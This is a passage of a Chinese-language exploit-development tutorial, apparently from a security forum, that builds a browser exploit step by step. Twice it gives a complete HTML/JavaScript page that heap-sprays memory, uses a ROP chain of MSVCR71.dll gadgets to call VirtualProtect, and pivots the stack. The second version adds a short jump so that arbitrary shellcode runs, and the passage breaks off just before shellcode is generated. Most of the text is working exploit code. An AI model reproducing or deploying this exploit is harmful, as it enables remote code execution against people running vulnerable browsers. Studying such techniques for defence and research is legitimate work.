
```
<!doctype html>

<html>

<head>

<script>



    //Fix BSTR spec

    function alloc(bytes, mystr) {

        while (mystr.length<bytes) mystr += mystr;

        return mystr.substr(0, (bytes-6)/2);

    }



    block_size = 0x1000;

    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c

    Padding = '';

    NopSlide = '';



    var Shellcode = unescape(



    //--------------------------------------------------------[ROP]-//

    // Generic ROP-chain based on MSVCR71.dll

    //--------------------------------------------------------------//

    "%u653d%u7c37" + // 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN

    "%ufdff%uffff" + // 0xfffffdff : Value to negate, will become 0x00000201 (dwSize)

    "%u7f98%u7c34" + // 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]

    "%u15a2%u7c34" + // 0x7c3415a2 : JMP [EAX] [msvcr71.dll]

    "%uffff%uffff" + // 0xffffffff : 

    "%u6402%u7c37" + // 0x7c376402 : skip 4 bytes [msvcr71.dll]

    "%u1e05%u7c35" + // 0x7c351e05 : NEG EAX # RETN [msvcr71.dll] 

    "%u5255%u7c34" + // 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll] 

    "%u2174%u7c35" + // 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 

    "%u4f87%u7c34" + // 0x7c344f87 : POP EDX # RETN [msvcr71.dll] 

    "%uffc0%uffff" + // 0xffffffc0 : Value to negate, will become 0x00000040

    "%u1eb1%u7c35" + // 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll] 

    "%ud201%u7c34" + // 0x7c34d201 : POP ECX # RETN [msvcr71.dll] 

    "%ub001%u7c38" + // 0x7c38b001 : &Writable location [msvcr71.dll]

    "%u7f97%u7c34" + // 0x7c347f97 : POP EAX # RETN [msvcr71.dll] 

    "%ua151%u7c37" + // 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]

    "%u8c81%u7c37" + // 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 

    "%u5c30%u7c34" + // 0x7c345c30 : ptr to "push esp #  ret " [msvcr71.dll]



    //-------------------------------------------------[ROP Epilog]-//

    // After calling VirtalProtect() we are left with some junk.

    //--------------------------------------------------------------//

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" + // Junk

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +



    //-------------------------------------------[EIP - Stackpivot]-//

    // EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]

    //--------------------------------------------------------------//

    "%u8b05%u7c34"); // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]



    for (p = 0; p < padding_size; p++){ 

    Padding += unescape('%ub33f');}



    for (c = 0; c < block_size; c++){ 

    NopSlide += unescape('%u9090');}

    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));



    var OBJECT = Padding + Shellcode + NopSlide;

    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb



    var evil = new Array();

    for (var k = 0; k < 150; k++) {

        evil[k] = OBJECT.substr(0, OBJECT.length);

    }



    var data;

    var objArray = new Array(1150);



    setTimeout(function(){

    document.body.style.whiteSpace = "pre-line";



    //CollectGarbage();



        for (var i=0;i<1150;i++){

            objArray[i] = document.createElement('div');

            objArray[i].className = data += unescape("%u0c0c%u0c0c");

        }



        setTimeout(function(){document.body.innerHTML = "boo"}, 100)

        }, 100)



</script>

</head>

<body>

<p> </p>

</body>

</html>
```

从截图中我们可以看到我们在栈劫持后成功命中了第一个gadget，在调用`VirtualProtect`后直达我们留下来的junk处。

![](https://bbs.kanxue.com/upload/attach/201803/530966_MHKHBTP3JNKSXKQ.jpg)

![](https://bbs.kanxue.com/upload/attach/201803/530966_NFSFF3UXY36FP5E.jpg)

现在剩下的就是在junk buffer的最后插入一个短跳转，跳过我们的初始化EIP覆盖位置（`XCHG EAX,ESP #RETN`）。这里可以放任何shellcode，在短跳转后就得以执行！

```
<!doctype html>

<html>

<head>

<script>



    //Fix BSTR spec

    function alloc(bytes, mystr) {

        while (mystr.length<bytes) mystr += mystr;

        return mystr.substr(0, (bytes-6)/2);

    }



    block_size = 0x1000;

    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c

    Padding = '';

    NopSlide = '';



    var Shellcode = unescape(



    //--------------------------------------------------------[ROP]-//

    // Generic ROP-chain based on MSVCR71.dll

    //--------------------------------------------------------------//

    "%u653d%u7c37" + // 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN

    "%ufdff%uffff" + // 0xfffffdff : Value to negate, will become 0x00000201 (dwSize)

    "%u7f98%u7c34" + // 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]

    "%u15a2%u7c34" + // 0x7c3415a2 : JMP [EAX] [msvcr71.dll]

    "%uffff%uffff" + // 0xffffffff : 

    "%u6402%u7c37" + // 0x7c376402 : skip 4 bytes [msvcr71.dll]

    "%u1e05%u7c35" + // 0x7c351e05 : NEG EAX # RETN [msvcr71.dll] 

    "%u5255%u7c34" + // 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll] 

    "%u2174%u7c35" + // 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 

    "%u4f87%u7c34" + // 0x7c344f87 : POP EDX # RETN [msvcr71.dll] 

    "%uffc0%uffff" + // 0xffffffc0 : Value to negate, will become 0x00000040

    "%u1eb1%u7c35" + // 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll] 

    "%ud201%u7c34" + // 0x7c34d201 : POP ECX # RETN [msvcr71.dll] 

    "%ub001%u7c38" + // 0x7c38b001 : &Writable location [msvcr71.dll]

    "%u7f97%u7c34" + // 0x7c347f97 : POP EAX # RETN [msvcr71.dll] 

    "%ua151%u7c37" + // 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]

    "%u8c81%u7c37" + // 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 

    "%u5c30%u7c34" + // 0x7c345c30 : ptr to "push esp #  ret " [msvcr71.dll]



    //-------------------------------------------------[ROP Epilog]-//

    // After calling VirtalProtect() we are left with some junk.

    //--------------------------------------------------------------//

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" + // Junk

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u4141" +

    "%u4141%u04eb" + // 0xeb04 short jump to get over what used to be EIP



    //-------------------------------------------[EIP - Stackpivot]-//

    // EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]

    //--------------------------------------------------------------//

    "%u8b05%u7c34"); // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]



    for (p = 0; p < padding_size; p++){ 

    Padding += unescape('%ub33f');}



    for (c = 0; c < block_size; c++){ 

    NopSlide += unescape('%u9090');}

    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));



    var OBJECT = Padding + Shellcode + NopSlide;

    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb



    var evil = new Array();

    for (var k = 0; k < 150; k++) {

        evil[k] = OBJECT.substr(0, OBJECT.length);

    }



    var data;

    var objArray = new Array(1150);



    setTimeout(function(){

    document.body.style.whiteSpace = "pre-line";



    //CollectGarbage();



        for (var i=0;i<1150;i++){

            objArray[i] = document.createElement('div');

            objArray[i].className = data += unescape("%u0c0c%u0c0c");

        }



        setTimeout(function(){document.body.innerHTML = "boo"}, 100)

        }, 100)



</script>

</head>

<body>

<p> </p>

</body>

</html>
```

执行短跳转后，我们跳到了覆盖EIP的位置正后方，我们现在就可以执行任何选择的shellcode了。

![](https://bbs.kanxue.com/upload/attach/201803/530966_SCT36FW7VVUYKUW.jpg)

## Shellcode+游戏结束

最简单的部分，让我们生成一些shellcode！
